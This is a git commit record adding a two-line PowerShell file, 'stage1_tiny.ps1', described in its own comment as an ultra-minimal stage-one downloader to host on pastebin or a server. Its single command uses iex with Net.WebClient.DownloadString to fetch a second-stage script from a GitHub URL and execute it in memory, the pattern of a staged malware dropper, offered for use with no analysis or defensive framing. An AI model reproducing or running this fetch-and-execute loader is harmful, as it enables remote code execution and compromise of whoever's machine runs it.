c5ee7e295543c390dec1aa3d3e015257a054257f
taxesmmmm-collab <taxesmmmm@gmail.com>
2026-06-28 00:49:26 +0800

    Add files via upload

---
+++ stage1_tiny.ps1
@@ -0,0 +1,2 @@
+# Stage 1: Ultra-minimal downloader (host this on pastebin/your server)
+iex(New-Object Net.WebClient).DownloadString('https://github.com/taxesmmmm-collab/tsetinyourmymmas-ass/blob/25f8b44a5dd4b342c30471d0eb5af11704de7f35/stage2_full.ps1')
